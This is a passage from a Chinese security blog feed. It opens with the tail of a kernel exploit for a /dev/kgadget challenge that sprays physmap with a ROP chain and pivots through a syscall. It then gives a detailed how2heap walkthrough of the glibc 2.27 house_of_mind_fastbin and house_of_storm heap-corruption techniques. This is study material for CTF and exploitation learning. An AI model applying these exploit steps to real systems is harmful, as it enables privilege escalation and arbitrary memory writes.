\&quot;/dev/kgadget\&quot;!&quot;</span>);</span><br><span class="line"></span><br><span class="line">    page_size = sysconf(_SC_PAGESIZE);      <span class="comment">// the size of a page, namely 4096 bytes</span></span><br><span class="line"></span><br><span class="line">    info_log(<span class="string">&quot;Spraying physmap......&quot;</span>);</span><br><span class="line"></span><br><span class="line">    map_spray[<span class="number">0</span>] = mmap(<span class="literal">NULL</span>, page_size, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line">    makeROP(map_spray[<span class="number">0</span>]);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">1</span>; i&lt;<span class="number">15000</span>; i++)&#123;</span><br><span class="line">        map_spray[i] = mmap(<span class="literal">NULL</span>, page_size, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line">        <span class="keyword">if</span>(!map_spray[i])</span><br><span class="line">            error_log(<span class="string">&quot;Mmap Failure!&quot;</span>);</span><br><span class="line">        <span class="built_in">memcpy</span>(map_spray[i], map_spray[<span class="number">0</span>], page_size);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    guess = <span class="number">0xffff888000000000</span> + <span class="number">0x7000000</span>;</span><br><span class="line"></span><br><span class="line">    info_log(<span class="string">&quot;Ready to turn to kernel......&quot;</span>);</span><br><span class="line"></span><br><span class="line">    __asm__(<span class="string">&quot;mov r15, 0xdeadbeef;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov r14, 0xcafebabe;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov r13, 0xdeadbeef;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov r12, 0xcafebabe;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov r11, 0xdeadbeef;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov r10, 0xcafebabe;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov rbp, 0x12345678;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov rbx, 0x87654321;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov r9, poprsp_ret;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov r8, guess;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov rax, 0x10;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov rcx, 0x12345678;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov rdx, guess;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov rsi, 0x1bf52;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov rdi, dev;&quot;</span></span><br><span class="line">            <span class="string">&quot;syscall;&quot;</span></span><br><span class="line">            );</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>how2heap 深入学习(7)</title>
      <link href="/2023/02/28/how2heap-%E6%B7%B1%E5%85%A5%E5%AD%A6%E4%B9%A0-7/"/>
      <url>/2023/02/28/how2heap-%E6%B7%B1%E5%85%A5%E5%AD%A6%E4%B9%A0-7/</url>
      
        <content type="html"><![CDATA[<p>how2heap下载网址: <a href="https://github.com/shellphish/how2heap">传送门</a><br>Glibc源码查看网址：<a href="https://elixir.bootlin.com/glibc/glibc-2.27/source/malloc/malloc.c#L3516">传送门</a><br>参考书籍：CTF竞赛权威指南-pwn篇</p><p>测试环境：Ubuntu 18.04<br>Glibc 版本：Ubuntu GLIBC 2.27-3ubuntu1.5</p><p>按照顺序，本文将分析glibc 2.27文件夹下的第7~8源码，对house_of_storm进行了深入的分析。<br>如果本文的分析有任何错漏之处，还请各位读者不吝赐教，不胜感激。</p><h1 id="7-house-of-mind-fastbin"><a href="#7-house-of-mind-fastbin" class="headerlink" title="7. house_of_mind_fastbin"></a>7. house_of_mind_fastbin</h1><p>这是一种伪造arena以将一个大chunk中的一处值改为很大的利用方式，和glibc 2.23差别不大，但是2.23的分析感觉逻辑不是太清晰，还是再写一遍吧。</p><p><strong>Step 1: 分配0x1010的chunk，要改写的地址为(chunk head + 0x40)。</strong></p><p>这里解释一下为什么改写的是chunk head + 0x40。<br>这个chunk是要作为伪造的arena使用的，参考2.27的arena结构体——malloc_state如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">malloc_state</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="comment">/* Serialize access.  */</span></span><br><span class="line">  __libc_lock_define (, mutex);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Flags (formerly in max_fast).  */</span></span><br><span class="line">  <span class="type">int</span> flags;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Set if the fastbin chunks contain recently inserted free blocks.  */</span></span><br><span class="line">  <span class="comment">/* Note this is a bool but not all targets support atomics on booleans.  */</span></span><br><span class="line">  <span class="type">int</span> have_fastchunks;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Fastbins */</span></span><br><span class="line">  mfastbinptr fastbinsY[NFASTBINS];</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Base of the topmost chunk -- not otherwise kept in a bin */</span></span><br><span class="line">  mchunkptr top;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* The remainder from the most recent split of a small request */</span></span><br><span class="line">  mchunkptr last_remainder;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Normal bins packed as described above */</span></span><br><span class="line">  mchunkptr bins[NBINS * <span class="number">2</span> - <span class="number">2</span>];</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Bitmap of bins */</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> binmap[BINMAPSIZE];</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Linked list */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_state</span> *<span class="title">next</span>;</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Linked list for free arenas.  Access to this field is serialized</span></span><br><span class="line"><span class="comment">     by free_list_lock in arena.c.  */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_state</span> *<span class="title">next_free</span>;</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Number of threads attached to this arena.  0 if the arena is on</span></span><br><span class="line"><span class="comment">     the free list.  Access to this field is serialized by</span></span><br><span class="line"><span class="comment">     free_list_lock in arena.c.  */</span></span><br><span class="line">  INTERNAL_SIZE_T attached_threads;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Memory allocated from the system in this arena.  */</span></span><br><span class="line">  INTERNAL_SIZE_T system_mem;</span><br><span class="line">  INTERNAL_SIZE_T max_system_mem;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>后面分配的是0x60大小的fastbin chunk，会被链入到这个假chunk中，而链入的地址就是chunk head + 0x40。在2.23中这个地址为0x38，2.27由于添加了一个have_fastchunks这个成员，因此地址往后移动了8字节。</p><table align=center>    <tr align=center>        <td> addr </td> <td> 0x0 </td> <td> 0x4 </td> <td> 0x8 </td> <td> 0xC </td>    </tr>    <tr align=center>        <td> 0x603420 </td> <td> mutex </td> <td> flag </td> <td> have_fastchunks </td> <td>-</td>    </tr>    <tr align=center>        <td> 0x603430 </td> <td colspan=2> fastbinsY[0] (for chunk size=0x20) </td> <td colspan=2> fastbinsY[1] (for chunk size=0x30) </td>    </tr>    <tr align=center>        <td> 0x603440 </td> <td colspan=2> fastbinsY[2] (for chunk size=0x40) </td> <td colspan=2> fastbinsY[3] (for chunk size=0x50)  </td>    </tr>    <tr align=center>        <td> 0x603450 </td> <td colspan=2> <font color=red> fastbinsY[4] (for chunk size=0x60) </font> </td> <td colspan=2> ...... </td>    </tr></table><p><strong>Step 2: 设置假arena的system_mem为0xFFFFFF。</strong></p><p>system_mem标志的是这个arena管理的空间大小。在_int_malloc函数中有这么一项检查：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (__builtin_expect (chunksize_nomask (victim) &lt;= <span class="number">2</span> * SIZE_SZ, <span class="number">0</span>)</span><br><span class="line">              || __builtin_expect (chunksize_nomask (victim)</span><br><span class="line">   &gt; av-&gt;system_mem, <span class="number">0</span>))</span><br><span class="line">            malloc_printerr (<span class="string">&quot;malloc(): memory corruption&quot;</span>);</span><br></pre></td></tr></table></figure><p>这个检查是在分配unsorted bin和large bins前进行的，表明请求的内存不能大于system_mem。</p><p><strong>Step 3: 计算假arena管理的空间位置。</strong></p><p>在系统堆初始化之后，将堆的大小定为0x4000000，因此后面申请的假arena管理的地址在这个堆之后。要计算这个堆的起始地址。</p><p><strong>Step 4: 一直分配chunk直到系统heap被占满。</strong></p><p>在源码中，这里一直分配大小为0x1ff00的chunk，因为mmap_threshold&#x3D;0x20000，它表示当用户分配大于0x20000的空间时，就不使用堆而是直接通过mmap获取了，这种情况需要避免，因此最大分配0x1ff00的chunk。</p><p><strong>Step 5: 分配一个0x60的chunk在堆空间之上。</strong></p><p><strong>Step 6: 填满0x60的tcache。</strong></p><p><strong>Step 7: 修改系统heap之上的假heap的控制信息。</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">heap_info</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  mstate ar_ptr; <span class="comment">/* Arena for this heap. */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">heap_info</span> *<span class="title">prev</span>;</span> <span class="comment">/* Previous heap. */</span></span><br><span class="line">  <span class="type">size_t</span> size;   <span class="comment">/* Current size in bytes. */</span></span><br><span class="line">  <span class="type">size_t</span> mprotect_size; <span class="comment">/* Size in bytes that has been mprotected</span></span><br><span class="line"><span class="comment">                           PROT_READ|PROT_WRITE.  */</span></span><br><span class="line">  <span class="comment">/* Make sure the following data is properly aligned, particularly</span></span><br><span class="line"><span class="comment">     that sizeof (heap_info) + 2 * SIZE_SZ is a multiple of</span></span><br><span class="line"><span class="comment">     MALLOC_ALIGNMENT. */</span></span><br><span class="line">  <span class="type">char</span> pad[<span class="number">-6</span> * SIZE_SZ &amp; MALLOC_ALIGN_MASK];</span><br><span class="line">&#125; heap_info;</span><br></pre></td></tr></table></figure><p>将计算得到的假heap地址的开头写入假arena的地址，即ar_ptr</p><p><strong>Step 8: 修改0x60 chunk的non_main_arena标志位。</strong></p><p><strong>Step 9: 释放最后一个chunk，修改假main_arena对应位置的值。</strong></p><p>此时，当我们free时，libc会根据_heap_info的ar_ptr找到我们的假chunk，然后在假chunk里面更改内容。这也就是我们的目的。</p><h1 id="8-house-of-storm"><a href="#8-house-of-storm" class="headerlink" title="8. house_of_storm"></a>8. house_of_storm</h1><p>源码要修改bss段的一个全局变量。</p><p>Tips: 如果使用gdb调试需要加上-no-pie参数去掉pie，否则后面的检查通不过。</p><p><strong>Step 1: 构造堆环境并进行堆风水检查。</strong></p><p>本漏洞利用需要的堆环境为：一个unsorted bin chunk和一个large bins chunk，且unsorted bin chunk大于large bins chunk。</p><p>首先分配0x4f0的chunk（之后将作为unsorted bin chunk），检查该chunk的地址最高非0位的值x，这里需要检查的原因在后面说明。具体检查方式：</p><p>首先判断x是否小于0x10，x小于0x10不行。</p><p>然后判断x的最低4位——bit-0~bit-3：</p><p>bit-3必须为0；<br>bit-2为1时bit-1不能为0；</p><p>由于要分配的大小在tcache范围，因此需要填满对应的tcache。</p><p>然后分配0x4e0的chunk，之后将作为large bins chunk。<br>分配一个小chunk防止top chunk合并。<br>随后依次释放0x4e0和0x4f0，先释放小chunk。再分配回大chunk再释放，小chunk就能顺利进入large bins。<br>至此，堆结构构造完成。</p><p>检查原因：因为最高非0位是作为size呈现的，因此不能小于0x10这个最小值。其次，chunk的大小应该是0x10的倍数，因此bit-3不能为1。再次，bit-2是non_main_arena标志位，bit-1是mmap标志位，这两者也不能够有一定的组合：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">(_int_malloc glibc <span class="number">2.27</span> line <span class="number">3438</span>)</span><br><span class="line">  assert (!mem || chunk_is_mmapped (mem2chunk (mem)) ||</span><br><span class="line">          av == arena_for_chunk (mem2chunk (mem)));</span><br></pre></td></tr></table></figure><p>不然也无法通过检查。</p><p><strong>Step 2: 修改unsorted bin chunk和large bins chunk的bk，large bins chunk的bk_nextsize。</strong></p><p>由于需要修改bss段内容，设需要修改的地址为y，要在这里伪造一个chunk，那么chunk头应该在y-0x10处。将unsorted bin chunk的bk修改为y-0x10，large bins chunk的bk修改为y-0x8。将large bins chunk的bk_nextsize修改为y-0x18-(偏移)。这个偏移指的是unsorted bin chunk的地址的非零字节数-1。</p><table><thead><tr><th align="center">addr</th><th align="center">+0x0</th><th align="center">+0x8</th></tr></thead><tbody><tr><td align="center">unsorted bin chunk + 0x10</td><td align="center">fd</td><td align="center">y - 0x10</td></tr><tr><td align="center">…</td><td align="center">…</td><td align="center">…</td></tr><tr><td align="center">large bin chunk + 0x10</td><td align="center">fd</td><td align="center">y - 0x8</td></tr><tr><td align="center">large bin chunk + 0x20</td><td align="center">fd_nextsize</td><td align="center">y - 0x18 - &lt;offset&gt;</td></tr><tr><td align="center">…</td><td align="center">…</td><td align="center">…</td></tr></tbody></table><p>下面是修改完成后两个chunk的情况：（目标地址为0x6020A0）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">Free chunk (unsortedbin) | PREV_INUSE</span><br><span class="line">Addr: 0x603250</span><br><span class="line">Size: 0x4f1</span><br><span class="line">fd: 0x7ffff7dcdca0</span><br><span class="line">bk: 0x602090</span><br><span class="line"></span><br><span class="line">Free chunk (largebins) | PREV_INUSE</span><br><span class="line">Addr: 0x603a00</span><br><span class="line">Size: 0x4e1</span><br><span class="line">fd: 0x7ffff7dce0c0</span><br><span class="line">bk: 0x602098</span><br><span class="line">fd_nextsize: 0x603a00</span><br><span class="line">bk_nextsize: 0x602076</span><br></pre></td></tr></table></figure><p><strong>Step 3: 调用calloc返回目标地址。</strong></p><p>这里使用calloc而不使用malloc是为了避开tcache。而在这一步中蕴含了很多操作。</p><p>由于last_remainder为空，因此unsorted bin中的这个chunk实际上并不会被切割，而是直接被分配到bins中去了。这里的unsorted bin chunk大于small bins的最大阈值，因此被分配到了large bins中。</p><p>在glibc 2.23中对large bins的插入规则没有进行详细分析，这里解释一下。</p><h2 id="large-bin的链入过程"><a href="#large-bin的链入过程" class="headerlink" title="large bin的链入过程"></a>large bin的链入过程</h2><p>在_int_malloc进入大循环中时，每一次会从unsorted bin中弹出一个chunk，不符合需求就将会被放入small bins或large bins中。假设unsorted bins中全部都会被放入一个large bins中。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// (line 3734)</span></span><br><span class="line">bck = victim-&gt;bk;</span><br><span class="line">......</span><br><span class="line"><span class="comment">// (line 3778~3779)</span></span><br><span class="line">unsorted_chunks (av)-&gt;bk = bck;</span><br><span class="line">    bck-&gt;fd = unsorted_chunks (av);</span><br><span class="line">    ......</span><br><span class="line"><span class="comment">// (line 3820)</span></span><br><span class="line">victim_index = largebin_index (size);</span><br><span class="line">    bck = bin_at (av, victim_index);</span><br><span class="line">    fwd = bck-&gt;fd;</span><br><span class="line">    ......</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      victim_index = largebin_index (size);</span><br><span class="line">      bck = bin_at (av, victim_index);</span><br><span class="line">      fwd = bck-&gt;fd;</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* maintain large bins in sorted order */</span></span><br><span class="line">      <span class="keyword">if</span> (fwd != bck)</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="comment">/* Or with inuse bit to speed comparisons */</span></span><br><span class="line">          size |= PREV_INUSE;</span><br><span class="line">          <span class="comment">/* if smaller than smallest, bypass loop below */</span></span><br><span class="line">          assert (chunk_main_arena (bck-&gt;bk));</span><br><span class="line">          <span class="keyword">if</span> ((<span class="type">unsigned</span> <span class="type">long</span>) (size) &lt; (<span class="type">unsigned</span> <span class="type">long</span>) chunksize_nomask (bck-&gt;bk))</span><br><span class="line">            &#123;</span><br><span class="line">              fwd = bck;</span><br><span class="line">              bck = bck-&gt;bk;</span><br><span class="line"></span><br><span class="line">              victim-&gt;fd_nextsize = fwd-&gt;fd;</span><br><span class="line">              victim-&gt;bk_nextsize = fwd-&gt;fd-&gt;bk_nextsize;</span><br><span class="line">              fwd-&gt;fd-&gt;bk_nextsize = victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;</span><br><span class="line">            &#125;</span><br><span class="line">          <span class="keyword">else</span></span><br><span class="line">            &#123;</span><br><span class="line">              assert (chunk_main_arena (fwd));</span><br><span class="line">              <span class="keyword">while</span> ((<span class="type">unsigned</span> <span class="type">long</span>) size &lt; chunksize_nomask (fwd))</span><br><span class="line">                &#123;</span><br><span class="line">                  fwd = fwd-&gt;fd_nextsize;</span><br><span class="line">  assert (chunk_main_arena (fwd));</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">              <span class="keyword">if</span> ((<span class="type">unsigned</span> <span class="type">long</span>) size == (<span class="type">unsigned</span> <span class="type">long</span>) chunksize_nomask (fwd))</span><br><span class="line">                <span class="comment">/* Always insert in the second position.  */</span></span><br><span class="line">                fwd = fwd-&gt;fd;</span><br><span class="line">              <span class="keyword">else</span></span><br><span class="line">                &#123;</span><br><span class="line">                  victim-&gt;fd_nextsize = fwd;</span><br><span class="line">                  victim-&gt;bk_nextsize = fwd-&gt;bk_nextsize;</span><br><span class="line">                  fwd-&gt;bk_nextsize = victim;</span><br><span class="line">                  victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;</span><br><span class="line">                &#125;</span><br><span class="line">              bck = fwd-&gt;bk;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">        victim-&gt;fd_nextsize = victim-&gt;bk_nextsize = victim;</span><br><span class="line">    &#125;</span><br><span class="line">mark_bin (av, victim_index);</span><br><span class="line">    victim-&gt;bk = bck;</span><br><span class="line">    victim-&gt;fd = fwd;</span><br><span class="line">    fwd-&gt;bk = victim;</span><br><span class="line">    bck-&gt;fd = victim;</span><br></pre></td></tr></table></figure><p>上面是所有涉及到bins修改的代码。每一次循环时，进行操作的chunk是victim，bck &#x3D; victim-&gt;bk。</p><pre><code>a. 将victim脱离unsorted bin链，即line 3778~3779。b. 如果victim正好是请求的大小，直接返回，即line 3783~3808c. 发现是large bin，进入large bin调整过程，即line 3818</code></pre><p>调整之前，首先找到这个large bin应该被放入的bin的索引，即line 3820的调用largebin_index函数；bck设置为这个bin的头指针，fwd设置为bck的fd指针。下面是判断这个bin是否有chunk。这里有一处需要注意：如果这个bin没有chunk，那么bck会指向前一个chunk。这样找到bck-&gt;fd时找到的是下一个bin，而下一个bin指向的正好是当前bin，就像下面这样。这就可以解释为什么<code>fwd != bck</code>可以用来判断bin中是否有chunk。不过存放chunk的真正bin应该是bck-&gt;fd而不是bck，这点也需要注意，在gdb调试过程中可以发现。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">00:0000│ r8 0x7ffff7dce0d0 (main_arena+1168) —▸ 0x7ffff7dce0c0 (main_arena+1152) —▸ 0x7ffff7dce0b0 (main_arena+1136) —▸ 0x7ffff7dce0a0 (main_arena+1120) —▸ 0x7ffff7dce090 (main_arena+1104) ◂— ...</span><br><span class="line">01:0008│    0x7ffff7dce0d8 (main_arena+1176) —▸ 0x7ffff7dce0c0 (main_arena+1152) —▸ 0x7ffff7dce0b0 (main_arena+1136) —▸ 0x7ffff7dce0a0 (main_arena+1120) —▸ 0x7ffff7dce090 (main_arena+1104) ◂— ...</span><br><span class="line">02:0010│    0x7ffff7dce0e0 (main_arena+1184) —▸ 0x602250 ◂— 0x0</span><br><span class="line">03:0018│    0x7ffff7dce0e8 (main_arena+1192) —▸ 0x602250 ◂— 0x0</span><br><span class="line">04:0020│    0x7ffff7dce0f0 (main_arena+1200) —▸ 0x7ffff7dce0e0 (main_arena+1184) —▸ 0x602250 ◂— 0x0</span><br><span class="line">05:0028│    0x7ffff7dce0f8 (main_arena+1208) —▸ 0x7ffff7dce0e0 (main_arena+1184) —▸ 0x602250 ◂— 0x0</span><br><span class="line">06:0030│    0x7ffff7dce100 (main_arena+1216) —▸ 0x7ffff7dce0f0 (main_arena+1200) —▸ 0x7ffff7dce0e0 (main_arena+1184) —▸ 0x602250 ◂— 0x0</span><br><span class="line">07:0038│    0x7ffff7dce108 (main_arena+1224) —▸ 0x7ffff7dce0f0 (main_arena+1200) —▸ 0x7ffff7dce0e0 (main_arena+1184) —▸ 0x602250 ◂— 0x0</span><br></pre></td></tr></table></figure><p>如果这个bin中没有chunk，则将victim链入bin中，将fd_nextsize和bk_nextsize设为其自身。如果有，则继续下面的操作。这大致可以用几张图来展示。</p><p>如果victim的size小于这个bin中最后一个chunk的size，则进行下面的操作，将victim链入到bin的最后位置。<font color=red><strong>注意：每一个bin的第一个chunk的bk和最后一个chunk的fd指向的并不是这个bin的头指针，而是上一个bin的头指针！</strong></font></p><p><img src="https://img-blog.csdnimg.cn/d68f29357c494cec8f1e9bcfac0a44c2.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBATDNIX0NvTGlu,size_20,color_FFFFFF,t_70,g_se,x_16#pic_center"></p><p>否则，进行如下操作：</p><p>找到应该插入的位置，如果没有找到与victim大小相同的chunk，则进行插入操作，更新fd, bk, fd_nextsize和bk_nextsize。如下图：<br><img src="https://img-blog.csdnimg.cn/4908f92cefb14ee49c54f5fd69e68888.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBATDNIX0NvTGlu,size_20,color_FFFFFF,t_70,g_se,x_16#pic_center"></p><p>如果找到了与victim大小相同的chunk，则在其后进行插入，使victim成为这个大小的chunk中第二靠前的chunk。如下图：</p><p><img src="https://img-blog.csdnimg.cn/2dbc637079db42c680c0dc6be4bcff4b.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBATDNIX0NvTGlu,size_20,color_FFFFFF,t_70,g_se,x_16#pic_center" alt="在这里插入图片描述"></p><p>综上所述，large bin要维护的实际上是这样一个结构，其中每一个bin里面可以按照chunk的大小划分，bin head指向的是最大的chunk，那些大小相同的chunk中只有最靠前的chunk有fd_nextsize和bk_nextsize。</p><p><img src="https://img-blog.csdnimg.cn/6361855305414fe18511dd86e492d732.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBATDNIX0NvTGlu,size_20,color_FFFFFF,t_70,g_se,x_16#pic_center"></p><hr><p>再回到这个漏洞上面来。整个漏洞的执行过程一共有十几个调整bin的步骤。在漏洞调整chunk之后，bins的结构如图：</p><p><img src="https://img-blog.csdnimg.cn/aa9ef778e43445a98099a3920bb0ef77.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBATDNIX0NvTGlu,size_20,color_FFFFFF,t_70,g_se,x_16#pic_center"></p><p>调整的过程如下：</p><p><img src="https://img-blog.csdnimg.cn/97c30be89a9448c59f161ddc8fc92fdc.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBATDNIX0NvTGlu,size_20,color_FFFFFF,t_70,g_se,x_16#pic_center"></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// line 3778~3779, Step 0</span></span><br><span class="line">unsorted_chunks (av)-&gt;bk = bck;</span><br><span class="line">    bck-&gt;fd = unsorted_chunks (av);</span><br><span class="line"><span class="comment">// line 3820~3822, Step 1, 2</span></span><br><span class="line">    victim_index = largebin_index (size);</span><br><span class="line">    bck = bin_at (av, victim_index);</span><br><span class="line">    fwd = bck-&gt;fd;</span><br><span class="line"><span class="comment">// line 3856~3859, Step 3, 4, 5, 6</span></span><br><span class="line">victim-&gt;fd_nextsize = fwd;</span><br><span class="line">    victim-&gt;bk_nextsize = fwd-&gt;bk_nextsize;</span><br><span class="line">    fwd-&gt;bk_nextsize = victim;</span><br><span class="line">    victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;</span><br><span class="line"><span class="comment">// line 3861, Step 7</span></span><br><span class="line">bck = fwd-&gt;bk;</span><br><span class="line"><span class="comment">// line 3869~3872, Step 8, 9, 10, 11</span></span><br><span class="line">victim-&gt;bk = bck;</span><br><span class="line">    victim-&gt;fd = fwd;</span><br><span class="line">    fwd-&gt;bk = victim;</span><br><span class="line">    bck-&gt;fd = victim;</span><br></pre></td></tr></table></figure><p>之后再次进行一次循环，到达line 3778时将victim赋值为target-0x10（Step 0中已经将unsorted bin head赋值为target-0x10）。后面判断target-0x10这个chunk的大小，发现正好满足（Step 6中错位赋值所致），因此返回target。</p><p>这个地方非常不好理解，要知道它为什么会返回target，我死抠源码抠了好几天才捋清楚这一整个过程到底是怎么一个流程。建议对照源码仔细消化理解，搞清楚每一步干了什么。gdb有的时候调试源码定位不准确，因此只能这样一步步去推演了。</p><p>用了这么长时间，算是把house of storm研究透了，这种攻击方式真是巧妙，能够想到这种方式的人真的是天才。</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>信息安全数学基础 Chapter 4——二次剩余与方根</title>
      <link href="/2023/02/28/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%95%B0%E5%AD%A6%E5%9F%BA%E7%A1%80-Chapter-4%E2%80%94%E2%80%94%E4%BA%8C%E6%AC%A1%E5%89%A9%E4%BD%99%E4%B8%8E%E6%96%B9%E6%A0%B9/"/>
